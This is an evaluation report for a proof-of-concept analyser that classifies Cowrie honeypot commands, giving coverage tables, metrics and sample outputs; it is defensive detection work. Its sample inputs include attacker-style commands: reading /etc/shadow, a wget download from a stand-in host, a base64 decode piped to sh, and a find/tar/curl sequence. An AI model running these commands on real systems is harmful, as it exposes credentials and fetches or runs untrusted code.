# Typed-semantic PoC coverage results

Evaluation date: 2026-07-30

Starting revision:
`c78f52bcf48e5b21773a0e566dfe51f5d737d792`

Combined acceptance revision:
`f0341568c65cacf2f59b75ab989655b8ce56d863`

## Minimum final coverage target

The minimum convincing thesis/controlled-PoC surface is:

1. common Cowrie inspection;
2. resolved sensitive-path reads;
3. direct Cowrie transfer observations;
4. command HTTP(S) transfer attempts, explicitly distinct from completion;
5. bounded filesystem-change command observations; and
6. bounded interpreter execution-attempt observations.

This covers discovery, credential exposure review, direct and attempted
transfer, filesystem staging/change, and execution-attempt demonstrations
using literal Cowrie evidence. It deliberately excludes claims that require
file contents, real-host state, attacker intent, or causal inference.

## Coverage matrix

| Behavior | Typed evidence required | Finding / guidance / hypothesis value | Ambiguity and overclaim risk | Final disposition |
| --- | --- | --- | --- | --- |
| Host, account, network, process, filesystem inspection/search | Exactly one reviewed inspection operation; successful single fragment; all referenced entities/paths resolved | Low/medium thesis value; bounded observation; no hypothesis or specialized action | Low when result contents and intent are excluded | **Activated** |
| Credential-path content read | Same resolved path referenced by `file_read` and `credential_path_read`; successful single fragment | High; finding plus manual exposure/reuse review | Acquisition/use and real-host effect are unobservable | **Activated** |
| Direct Cowrie upload/download | Direct Cowrie transfer event and exact artifact SHA-256 | High; direct-event finding plus manual indicator review | Must not be inferred from downloader commands | **Activated** |
| Command HTTP(S) transfer attempt | Same resolved URL referenced by `remote_content_access` and `transfer_attempt`; successful single fragment | High; attempt-only finding; no specialized action/hypothesis | Received bytes, destination creation, hash, and completion are unobservable | **Activated** |
| Create/truncate, append, modify, chmod, mkdir, move, delete | Exactly one supported mutation; successful single fragment; every target/path identity resolved | High; bounded filesystem-change finding; no specialized action/hypothesis | Cowrie success is not resulting filesystem state, cleanup, persistence, or real-host effect | **Activated** |
| Reviewed interpreter execution attempt | Exact supported interpreter plus resolved script path or explicit inline-program entity; successful single fragment | High; finding plus manual process/audit corroboration | Program existence, completed execution, effects, and compromise are unobservable | **Activated** |
| Decode/transformation | Exact decoder, input/output facets, and outcome are retained | Moderate context value | Decode validity, output bytes, and pipe-fragment completion are unobservable; no retained raw demo evidence | **Shadow-only** |
| Scheduled-task inspect/modify/delete | Exact `crontab` operation and target | Moderate potential value | Retained example is compound-only; creation versus replacement and persistence are unobservable | **Shadow-only** |
| Service inspect/modify | Exact reviewed `systemctl` subcommand and service entity | Low incremental value | Prior state and transition/effect are unobservable; no retained raw demo evidence | **Shadow-only** |
| Search/collection/archive | Exact search, source paths, archive destination, and archive-create operation | Moderate context value | Contents, complete reads, collection intent, and successful archive bytes are unobservable | **Shadow-only** |
| Transfer → transform → execution | Exact shared identities and event order may be recorded | Useful contextual provenance | Shared identity/order is not causal or per-stage completion proof | **Context-only; no hypothesis/guidance** |
| Search → archive → transfer | Exact search/source/archive/transfer identity and per-stage outcomes would be required | Potential demonstration value | Current command subset does not prove archive upload or contents | **Context-only; no hypothesis/guidance** |
| Unsupported tools, aliases, arbitrary executables, malformed/incomplete syntax, expansions, wildcards, compound outcomes | No sufficient literal proof | None | Promotion would be guesswork | **Unknown / abstain** |

## Frozen evaluations

| Gate | Result |
| --- | --- |
| Filesystem independent + holdout | 40 cases; 19 positive cases and 21 negative cases; selection/finding precision, recall, F1 = 1.000; 0 false-positive selections |
| Execution independent + holdout | 36 cases; 12 positive and 24 negative; selection/finding/action precision, recall, F1 = 1.000; 0 false-positive selections |
| Command-transfer independent + holdout | 38 cases; 14 positive and 24 negative; selection/finding precision, recall, F1 = 1.000; 0 false-positive selections |
| Transformation shadow evaluation + holdout | 18/18 exact operation sequences; no authority |
| Scheduled-task shadow evaluation + holdout | 18/18 exact operation sequences; no family authority |
| Service shadow evaluation + holdout | 18/18 exact operation sequences; no family authority |
| Collection shadow evaluation + holdout | 18/18 exact operation sequences; no collection authority |
| Cross-family relationship evaluation + holdout | 12/12 passed; all references resolved; 0 causal hypotheses/actions |
| Combined PoC acceptance | 18/18 scenarios and 39/39 expected operation entries; 13/13 expected family-output pairs; 5/5 expected family-action pairs; 0 extra/missing pairs |
| Persistence and artifacts | 18/18 SQLite records round-tripped; JSON/Markdown/PDF/STIX manifests and contracts valid |
| Determinism | 100% repeated fact sets, assessment IDs, findings, and guidance IDs |
| Unsupported output | 0 specialized unsupported findings/actions; 0 hypotheses; 0 automatic/unsafe actions |
| Full repository suite | **950 passed, 7 skipped** |

The frozen command-transfer v1 set had four incorrect expected entity labels:
hard-abstained commands retained their literal URLs. The file remains
unchanged, the discrepancies are classified in
`docs/COMMAND_TRANSFER_EVALUATION_V1_ERRATUM.md`, and all four produced
`unknown`, zero selections, and zero output authority. The separate holdout
passed all entity and authority expectations.

## Representative actual outputs

### Credential read

Input: `tail -n 4 /etc/shadow`

- fact operations: `file_read` and `credential_path_read`, both referencing
  `typed_semantic_entity_3fa1ac80cba0298022f96075ca50b4e3`;
- v4 finding:
  `finding_381268ac2ba021bc9837f4113f461c2c`,
  `observed_credential_path_read_command`;
- v3 action: `review-credential-exposure-and-reuse`;
- action safety: manual approval `true`, auto-execute `false`;
- hypothesis sets: none;
- limitations explicitly deny credential acquisition/use, attacker intent,
  and real-host effect.

### Command transfer attempt

Input: `wget https://attempt.invalid/item -O /tmp/item`

- fact operations: `remote_content_access` and `transfer_attempt`, sharing the
  resolved URL entity;
- v4 finding:
  `finding_ba7fcd773c4b70bdf50c501c6cbf16f1`,
  `observed_cowrie_command_transfer_attempt`;
- v3 finding:
  `response_guidance_finding_81584ebeda1c4516d560714ff5d999d6`;
- specialized actions and hypotheses: none;
- limitations explicitly deny received bytes, completed transfer,
  destination creation, artifact identity, execution, and real-host effect.

### Decode-to-shell abstention

Input: `base64 -d /tmp/body.b64 | sh`

- first fact: `decode_transform`, `compound_unconfirmed`;
- second fact: `shell_pipe_execution_attempt`, `compound_unconfirmed`;
- relationship: `piped_to`, proof `shell_syntax`, with
  `evidence_link_not_causal_or_intent_proof`;
- v4/v3 specialized findings, actions, and hypotheses: none.

### Explicit execution attempt

Input: `bash /tmp/body.sh`

- fact operation: `execution_attempt` with a resolved path, Cowrie
  `reported_success`, fragment scope;
- v4 finding:
  `finding_8991f55b35cca6f31362bfdaa3020c24`;
- v3 action: `correlate-observed-execution-attempt`;
- action safety: manual approval `true`, auto-execute `false`;
- hypotheses: none;
- limitations deny program existence, completed execution, program effects,
  attacker intent, compromise, persistence, and real-host effect.

### Search, archive, and network command

Inputs: `find /srv -type f`, `tar -cf /tmp/srv.tar /srv`,
`curl https://receiver.invalid/status`

- facts retain `filesystem_search`, `file_read`, `archive_create`,
  `remote_content_access`, and `transfer_attempt`;
- only independent `inspection` and `transfer_attempt` findings are emitted;
- archive/collection and search→archive→transfer hypotheses/actions are
  suppressed;
- the network command is not represented as transfer of `/tmp/srv.tar`.

## Performance and bounds

The combined two-test acceptance run completed in 9.77 seconds wall time with
50,804 KiB maximum resident set size. Across the 18 cases it built 30 facts,
25 entities, three relationships, and three chains. The largest case had
three facts; the largest observed relationship/chain count was one each.
These are comfortably below the existing immutable limits (2,048 facts,
8,192 entities, 8,192 relationships, and 2,048 chains), but they are
functional-test measurements rather than a load benchmark.

## Remaining limitations

- Evaluation data are synthetic and locally authored; an independent reviewer
  has not yet validated the final combined set.
- Retained raw telemetry is sparse. The privacy-minimized large corpus cannot
  validate literal command semantics.
- Transformation, scheduled task, service, collection/archive, arbitrary
  executable, and cross-family causal outputs intentionally remain
  shadow/context-only.
- Cowrie command outcomes never prove real-host state or actual program/file
  effects.
- No deployment, production load, production data, GCP, or Raspberry Pi was
  accessed in this batch.
- Seven skipped tests remain visible in the full-suite result; their
  environment-specific reasons must be reviewed during deployment evaluation.

## Readiness decision

The local semantic system is **ready for controlled deployment evaluation**,
not yet production acceptance. The activated surface is representative enough
for the thesis and controlled PoC while retaining conservative abstention and
the v4/v3 authority boundaries.
